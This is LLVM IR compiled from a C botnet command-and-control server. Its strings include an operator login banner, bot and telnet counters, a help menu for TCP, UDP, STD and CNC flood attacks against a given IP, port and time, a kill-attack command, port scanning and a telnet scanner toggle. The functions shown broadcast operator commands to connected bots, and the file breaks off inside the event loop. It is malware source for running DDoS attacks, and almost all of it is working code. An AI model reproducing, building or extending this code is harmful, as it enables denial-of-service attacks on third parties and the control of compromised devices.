; ModuleID = 'server.c'
source_filename = "server.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.clientdata_t = type { i32, [7 x i8], i8 }
%struct.telnetdata_t = type { i32, i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, %struct._IO_codecvt*, %struct._IO_wide_data*, %struct._IO_FILE*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type opaque
%struct._IO_codecvt = type opaque
%struct._IO_wide_data = type opaque
%struct.account = type { [20 x i8], [20 x i8] }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@.str = private unnamed_addr constant [4 x i8] c"31m\00", align 1
@.str.1 = private unnamed_addr constant [4 x i8] c"32m\00", align 1
@.str.2 = private unnamed_addr constant [4 x i8] c"33m\00", align 1
@.str.3 = private unnamed_addr constant [4 x i8] c"34m\00", align 1
@.str.4 = private unnamed_addr constant [4 x i8] c"35m\00", align 1
@.str.5 = private unnamed_addr constant [4 x i8] c"36m\00", align 1
@colorCodes = dso_local global [6 x i8*] [i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.5, i32 0, i32 0)], align 16
@.str.6 = private unnamed_addr constant [3 x i8] c"80\00", align 1
@.str.7 = private unnamed_addr constant [5 x i8] c"3075\00", align 1
@.str.8 = private unnamed_addr constant [4 x i8] c"443\00", align 1
@.str.9 = private unnamed_addr constant [3 x i8] c"22\00", align 1
@.str.10 = private unnamed_addr constant [3 x i8] c"53\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"3074\00", align 1
@.str.12 = private unnamed_addr constant [3 x i8] c"23\00", align 1
@.str.13 = private unnamed_addr constant [5 x i8] c"8080\00", align 1
@ports = dso_local global [8 x i8*] [i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.13, i32 0, i32 0)], align 16
@.str.14 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@clients = dso_local global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = dso_local global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str.15 = private unnamed_addr constant [6 x i8] c"\1B[36m\00", align 1
@.str.16 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.17 = private unnamed_addr constant [17 x i8] c"\0D\0A\1B[%s:~$ \1B[37m \00", align 1
@.str.18 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.19 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.20 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.21 = private unnamed_addr constant [15 x i8] c"!* SCANNER ON\0A\00", align 1
@.str.22 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.23 = private unnamed_addr constant [8 x i8] c"REPORT \00", align 1
@telFD = internal global %struct._IO_FILE* null, align 8
@.str.24 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@TELFound = internal global i32 0, align 4
@.str.25 = private unnamed_addr constant [8 x i8] c"PROBING\00", align 1
@scannerreport = internal global i32 0, align 4
@.str.26 = private unnamed_addr constant [15 x i8] c"REMOVING PROBE\00", align 1
@.str.27 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.28 = private unnamed_addr constant [11 x i8] c"buf: \22%s\22\0A\00", align 1
@.str.29 = private unnamed_addr constant [69 x i8] c"%c]0; :|: Bots Online: %d :|: Telnets: %d :|: Users Online: %d :|:%c\00", align 1
@managesConnected = internal global i32 0, align 4
@.str.30 = private unnamed_addr constant [10 x i8] c"login.txt\00", align 1
@.str.31 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.32 = private unnamed_addr constant [6 x i8] c"%s %s\00", align 1
@accounts = internal global [50 x %struct.account] zeroinitializer, align 16
@.str.33 = private unnamed_addr constant [20 x i8] c"\1B[%sUsername:\1B[30m \00", align 1
@.str.34 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.35 = private unnamed_addr constant [20 x i8] c"\1B[%sPassword:\1B[30m \00", align 1
@.str.36 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.37 = private unnamed_addr constant [37 x i8] c"\1B[36m Attempting To Log IP Address\0D\0A\00", align 1
@.str.38 = private unnamed_addr constant [38 x i8] c"\1B[36m Successfully Logged Bye Bitch\0D\0A\00", align 1
@.str.39 = private unnamed_addr constant [16 x i8] c"\0D\0A       \1B[%s\0D\0A\00", align 1
@.str.40 = private unnamed_addr constant [15 x i8] c"\1B[1A\1B[2J\1B[1;1H\00", align 1
@.str.41 = private unnamed_addr constant [77 x i8] c" \1B[35m                                                                    \0D\0A\00", align 1
@.str.42 = private unnamed_addr constant [72 x i8] c"              ,,        ,,    ,,              ,,                     \0D\0A\00", align 1
@.str.43 = private unnamed_addr constant [72 x i8] c"    .g88q.   *MM      `7MM    db              db                     \0D\0A\00", align 1
@.str.44 = private unnamed_addr constant [72 x i8] c" .dP'    `YM. MM        MM                                           \0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [72 x i8] c" dM'      `MM MM,dMMb.  MM  `7MM `7M'   `MF'`7MM  ,pW'Wq.`7MMpMMMb.  \0D\0A\00", align 1
@.str.46 = private unnamed_addr constant [72 x i8] c" MM        MM MM    `Mb MM    MM   VA   ,V    MM 6W'   `Wb MM    MM  \0D\0A\00", align 1
@.str.47 = private unnamed_addr constant [72 x i8] c" MM.      ,MP MM     M8 MM    MM    VA ,V     MM 8M     M8 MM    MM  \0D\0A\00", align 1
@.str.48 = private unnamed_addr constant [72 x i8] c" `Mb.    ,dP' MM.   ,M9 MM    MM     VVV      MM YA.   ,A9 MM    MM  \0D\0A\00", align 1
@.str.49 = private unnamed_addr constant [72 x i8] c"   ''bmmd''   P^YbmdP'.JMML..JMML.    W     .JMML.`Ybmd9'.JMML  JMML.\0D\0A\00", align 1
@.str.50 = private unnamed_addr constant [71 x i8] c"                                                                    \0D\0A\00", align 1
@.str.51 = private unnamed_addr constant [45 x i8] c"\1B[%s\0D\0AWelcome,\1B[34m %s\1B[%s To the Oblivion\0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [16 x i8] c"\1B[%s~$ \1B[0;37m \00", align 1
@.str.53 = private unnamed_addr constant [5 x i8] c"SHOW\00", align 1
@.str.54 = private unnamed_addr constant [5 x i8] c"BOTS\00", align 1
@.str.55 = private unnamed_addr constant [5 x i8] c"bots\00", align 1
@.str.56 = private unnamed_addr constant [77 x i8] c"[\1B[36m+\1B[37m] Bots Online: %d [\1B[31m-\1B[37m] Users Online: %d [\1B[36m+\1B[37m]\0D\0A\00", align 1
@.str.57 = private unnamed_addr constant [7 x i8] c"status\00", align 1
@.str.58 = private unnamed_addr constant [7 x i8] c"STATUS\00", align 1
@.str.59 = private unnamed_addr constant [80 x i8] c"[\1B[36m+\1B[37m] Telnet devices: %d [\1B[31m-\1B[37m] Telnet status: % [\1B[36m+\1B[37m]\0D\0A\00", align 1
@.str.60 = private unnamed_addr constant [7 x i8] c"!* STD\00", align 1
@.str.61 = private unnamed_addr constant [7 x i8] c"!* UDP\00", align 1
@.str.62 = private unnamed_addr constant [7 x i8] c"!* TCP\00", align 1
@.str.63 = private unnamed_addr constant [55 x i8] c"[\1B[36m+\1B[37m] Successfully Sent Attack [\1B[36m+\1B[37m]\0D\0A\00", align 1
@.str.64 = private unnamed_addr constant [6 x i8] c"rules\00", align 1
@.str.65 = private unnamed_addr constant [6 x i8] c"RULES\00", align 1
@.str.66 = private unnamed_addr constant [159 x i8] c"Please Read The Following Rules if not will result in ban\0D\0A1.) DO NOT SHARE YOUR ACCOUNT INFO \0D\0A2.) DO NOT SPAM THE NET\0D\0A3.) Dont hit any goverment websites\0D\0A\00", align 1
@.str.67 = private unnamed_addr constant [5 x i8] c"HELP\00", align 1
@.str.68 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@.str.69 = private unnamed_addr constant [2 x i8] c"?\00", align 1
@.str.70 = private unnamed_addr constant [70 x i8] c"\1B[37m[+\1B[36m]Attack Commands----------------------------------\1B[37m\0D\0A\00", align 1
@.str.71 = private unnamed_addr constant [56 x i8] c"\1B[37m!* TCP [IP] [PORT] [TIME] 32 all 0 1 | TCP FLOOD\0D\0A\00", align 1
@.str.72 = private unnamed_addr constant [52 x i8] c"\1B[37m!* UDP [IP] [PORT] [TIME] 32 0 1 | UDP FLOOD\0D\0A\00", align 1
@.str.73 = private unnamed_addr constant [45 x i8] c"\1B[37m!* STD [IP] [PORT] [TIME] | STD FLOOD\0D\0A\00", align 1
@.str.74 = private unnamed_addr constant [51 x i8] c"\1B[37m!* CNC [IP] [ADMIN PORT] [TIME] | CNC FLOOD\0D\0A\00", align 1
@.str.75 = private unnamed_addr constant [70 x i8] c"\1B[37m[+]\1B[36mExtra Commands-----------------------------------\1B[37m\0D\0A\00", align 1
@.str.76 = private unnamed_addr constant [39 x i8] c"\1B[37m!* KILLATTK | KILLS ALL ATTACKS\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [60 x i8] c"\1B[37m!* PORT_SCAN IP | MAKE SURE TO PUT THE IP AT THE END\0D\0A\00", align 1
@.str.78 = private unnamed_addr constant [72 x i8] c"\1B[37m[+]\1B[36mTerminal Commands----------------------------------\1B[37m\0D\0A\00", align 1
@.str.79 = private unnamed_addr constant [30 x i8] c"\1B[37mBOTS | SHOWS BOT COUNT\0D\0A\00", align 1
@.str.80 = private unnamed_addr constant [32 x i8] c"\1B[37mCLS | CLEARS YOUR SCREEN\0D\0A\00", align 1
@.str.81 = private unnamed_addr constant [10 x i8] c"PORT_SCAN\00", align 1
@.str.82 = private unnamed_addr constant [20 x i8] c"Open Ports %s, %s\0D\0A\00", align 1
@.str.83 = private unnamed_addr constant [6 x i8] c"CLEAR\00", align 1
@.str.84 = private unnamed_addr constant [6 x i8] c"clear\00", align 1
@.str.85 = private unnamed_addr constant [4 x i8] c"cls\00", align 1
@.str.86 = private unnamed_addr constant [4 x i8] c"CLS\00", align 1
@.str.87 = private unnamed_addr constant [72 x i8] c"                                                                     \0D\0A\00", align 1
@.str.88 = private unnamed_addr constant [5 x i8] c"exit\00", align 1
@.str.89 = private unnamed_addr constant [5 x i8] c"EXIT\00", align 1
@.str.90 = private unnamed_addr constant [7 x i8] c"LOGOUT\00", align 1
@.str.91 = private unnamed_addr constant [5 x i8] c"2000\00", align 1
@.str.92 = private unnamed_addr constant [5 x i8] c"2100\00", align 1
@.str.93 = private unnamed_addr constant [5 x i8] c"2200\00", align 1
@.str.94 = private unnamed_addr constant [5 x i8] c"2300\00", align 1
@.str.95 = private unnamed_addr constant [5 x i8] c"2400\00", align 1
@.str.96 = private unnamed_addr constant [5 x i8] c"2500\00", align 1
@.str.97 = private unnamed_addr constant [17 x i8] c"Over Time By %s\0A\00", align 1
@.str.98 = private unnamed_addr constant [13 x i8] c"OverTime.log\00", align 1
@.str.99 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.100 = private unnamed_addr constant [28 x i8] c"ATTEMPT TO KILL BOTS BY %s\0A\00", align 1
@.str.101 = private unnamed_addr constant [10 x i8] c"LOLNOGTFO\00", align 1
@.str.102 = private unnamed_addr constant [9 x i8] c"KILL.log\00", align 1
@.str.103 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.104 = private unnamed_addr constant [26 x i8] c"ATTEMPT TO SH BOTS BY %s\0A\00", align 1
@.str.105 = private unnamed_addr constant [7 x i8] c"SH.log\00", align 1
@.str.106 = private unnamed_addr constant [10 x i8] c"%s: \22%s\22\0A\00", align 1
@.str.107 = private unnamed_addr constant [11 x i8] c"report.log\00", align 1
@.str.108 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.109 = private unnamed_addr constant [17 x i8] c"ERROR on binding\00", align 1
@.str.110 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.111 = private unnamed_addr constant [39 x i8] c"Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.112 = private unnamed_addr constant [11 x i8] c"telnet.txt\00", align 1
@.str.113 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.114 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.115 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.116 = private unnamed_addr constant [7 x i8] c"HACKER\00", align 1
@hackz = dso_local global i32 0, align 4
@.str.117 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@.str.118 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.119 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.120 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @fdgets(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  br label %9

9:                                                ; preds = %27, %3
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

12:                                               ; preds = %9
  %13 = load i32, i32* %7, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

16:                                               ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %7, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

25:                                               ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

27:                                               ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %8, align 4
  %35 = load i32, i32* %7, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %7, align 4
  br label %9, !llvm.loop !6

37:                                               ; preds = %25
  %38 = load i32, i32* %8, align 4
  ret i32 %38
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @trim(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #8
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

10:                                               ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #8
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

19:                                               ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10, !llvm.loop !8

22:                                               ; preds = %10
  br label %23

23:                                               ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

27:                                               ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #8
  %35 = icmp ne i32 %34, 0
  br label %36

36:                                               ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

38:                                               ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23, !llvm.loop !9

41:                                               ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

43:                                               ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

47:                                               ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

59:                                               ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43, !llvm.loop !10

62:                                               ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind readonly willreturn
declare i32 @isspace(i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @broadcast(i8* %0, i32 %1, i8* %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca %struct.tm*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca [1024 x i8*], align 16
  %14 = alloca [80 x i8], align 16
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i8* %2, i8** %6, align 8
  store i32 1, i32* %7, align 4
  %15 = load i8*, i8** %4, align 8
  %16 = call i32 @strcmp(i8* %15, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.14, i64 0, i64 0)) #8
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %18, label %19

18:                                               ; preds = %3
  store i32 0, i32* %7, align 4
  br label %19

19:                                               ; preds = %18, %3
  %20 = load i8*, i8** %4, align 8
  %21 = call i64 @strlen(i8* %20) #8
  %22 = add i64 %21, 10
  %23 = call noalias align 16 i8* @malloc(i64 %22) #9
  store i8* %23, i8** %8, align 8
  %24 = load i8*, i8** %8, align 8
  %25 = load i8*, i8** %4, align 8
  %26 = call i64 @strlen(i8* %25) #8
  %27 = add i64 %26, 10
  call void @llvm.memset.p0i8.i64(i8* align 1 %24, i8 0, i64 %27, i1 false)
  %28 = load i8*, i8** %8, align 8
  %29 = load i8*, i8** %4, align 8
  %30 = call i8* @strcpy(i8* %28, i8* %29) #9
  %31 = load i8*, i8** %8, align 8
  call void @trim(i8* %31)
  %32 = call i64 @time(i64* %9) #9
  %33 = call %struct.tm* @localtime(i64* %9) #9
  store %struct.tm* %33, %struct.tm** %10, align 8
  %34 = load %struct.tm*, %struct.tm** %10, align 8
  %35 = call i8* @asctime(%struct.tm* %34) #9
  store i8* %35, i8** %11, align 8
  %36 = load i8*, i8** %11, align 8
  call void @trim(i8* %36)
  store i32 0, i32* %12, align 4
  br label %37

37:                                               ; preds = %117, %19
  %38 = load i32, i32* %12, align 4
  %39 = icmp slt i32 %38, 1000000
  br i1 %39, label %40, label %120

40:                                               ; preds = %37
  %41 = load i32, i32* %12, align 4
  %42 = load i32, i32* %5, align 4
  %43 = icmp eq i32 %41, %42
  br i1 %43, label %61, label %44

44:                                               ; preds = %40
  %45 = load i32, i32* %12, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %46
  %48 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %47, i32 0, i32 2
  %49 = load i8, i8* %48, align 1
  %50 = icmp ne i8 %49, 0
  br i1 %50, label %62, label %51

51:                                               ; preds = %44
  %52 = load i32, i32* %7, align 4
  %53 = icmp eq i32 %52, 0
  br i1 %53, label %61, label %54

54:                                               ; preds = %51
  %55 = load i32, i32* %12, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %56
  %58 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %57, i32 0, i32 0
  %59 = load i32, i32* %58, align 8
  %60 = icmp ne i32 %59, 0
  br i1 %60, label %62, label %61

61:                                               ; preds = %54, %51, %40
  br label %117

62:                                               ; preds = %54, %44
  %63 = load i32, i32* %7, align 4
  %64 = icmp ne i32 %63, 0
  br i1 %64, label %65, label %82

65:                                               ; preds = %62
  %66 = load i32, i32* %12, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %67
  %69 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %68, i32 0, i32 0
  %70 = load i32, i32* %69, align 8
  %71 = icmp ne i32 %70, 0
  br i1 %71, label %72, label %82

72:                                               ; preds = %65
  %73 = load i32, i32* %12, align 4
  %74 = call i64 @send(i32 %73, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.15, i64 0, i64 0), i64 5, i32 16384)
  %75 = load i32, i32* %12, align 4
  %76 = load i8*, i8** %6, align 8
  %77 = load i8*, i8** %6, align 8
  %78 = call i64 @strlen(i8* %77) #8
  %79 = call i64 @send(i32 %75, i8* %76, i64 %78, i32 16384)
  %80 = load i32, i32* %12, align 4
  %81 = call i64 @send(i32 %80, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.16, i64 0, i64 0), i64 2, i32 16384)
  br label %82

82:                                               ; preds = %72, %65, %62
  %83 = load i32, i32* %12, align 4
  %84 = load i8*, i8** %4, align 8
  %85 = load i8*, i8** %4, align 8
  %86 = call i64 @strlen(i8* %85) #8
  %87 = call i64 @send(i32 %83, i8* %84, i64 %86, i32 16384)
  %88 = getelementptr inbounds [1024 x i8*], [1024 x i8*]* %13, i64 0, i64 0
  %89 = bitcast i8** %88 to i8*
  %90 = call i32 @rand() #9
  %91 = srem i32 %90, 6
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [6 x i8*], [6 x i8*]* @colorCodes, i64 0, i64 %92
  %94 = load i8*, i8** %93, align 8
  %95 = call i32 (i8*, i8*, ...) @sprintf(i8* %89, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.17, i64 0, i64 0), i8* %94) #9
  %96 = load i32, i32* %7, align 4
  %97 = icmp ne i32 %96, 0
  br i1 %97, label %98, label %113

98:                                               ; preds = %82
  %99 = load i32, i32* %12, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %100
  %102 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %101, i32 0, i32 0
  %103 = load i32, i32* %102, align 8
  %104 = icmp ne i32 %103, 0
  br i1 %104, label %105, label %113

105:                                              ; preds = %98
  %106 = load i32, i32* %12, align 4
  %107 = getelementptr inbounds [1024 x i8*], [1024 x i8*]* %13, i64 0, i64 0
  %108 = bitcast i8** %107 to i8*
  %109 = getelementptr inbounds [1024 x i8*], [1024 x i8*]* %13, i64 0, i64 0
  %110 = bitcast i8** %109 to i8*
  %111 = call i64 @strlen(i8* %110) #8
  %112 = call i64 @send(i32 %106, i8* %108, i64 %111, i32 16384)
  br label %116

113:                                              ; preds = %98, %82
  %114 = load i32, i32* %12, align 4
  %115 = call i64 @send(i32 %114, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.18, i64 0, i64 0), i64 1, i32 16384)
  br label %116

116:                                              ; preds = %113, %105
  br label %117

117:                                              ; preds = %116, %61
  %118 = load i32, i32* %12, align 4
  %119 = add nsw i32 %118, 1
  store i32 %119, i32* %12, align 4
  br label %37, !llvm.loop !11

120:                                              ; preds = %37
  %121 = load i8*, i8** %8, align 8
  call void @free(i8* %121) #9
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8*, i8*) #2

; Function Attrs: nounwind
declare noalias align 16 i8* @malloc(i64) #3

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #4

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) #3

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) #3

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

; Function Attrs: nounwind
declare i32 @rand() #3

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @epollEventLoop(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.epoll_event, align 1
  %4 = alloca %struct.epoll_event*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr, align 2
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.clientdata_t*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i64, align 8
  %17 = alloca [2048 x i8], align 16
  %18 = alloca i8*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %21 = call noalias align 16 i8* @calloc(i64 1000000, i64 12) #9
  %22 = bitcast i8* %21 to %struct.epoll_event*
  store %struct.epoll_event* %22, %struct.epoll_event** %4, align 8
  br label %23

23:                                               ; preds = %1, %243
  %24 = load volatile i32, i32* @epollFD, align 4
  %25 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %26 = call i32 @epoll_wait(i32 %24, %struct.epoll_event* %25, i32 1000000, i32 -1)
  store i32 %26, i32* %6, align 4
  store i32 0, i32* %7, align 4
  br label %27

27:                                               ; preds = %240, %23
  %28 = load i32, i32* %7, align 4
  %29 = load i32, i32* %6, align 4
  %30 = icmp slt i32 %28, %29
  br i1 %30, label %31, label %243

31:                                               ; preds = %27
  %32 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %33 = load i32, i32* %7, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %32, i64 %34
  %36 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %35, i32 0, i32 0
  %37 = load i32, i32* %36, align 1
  %38 = and i32 %37, 8
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %58, label %40

40:                                               ; preds = %31
  %41 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
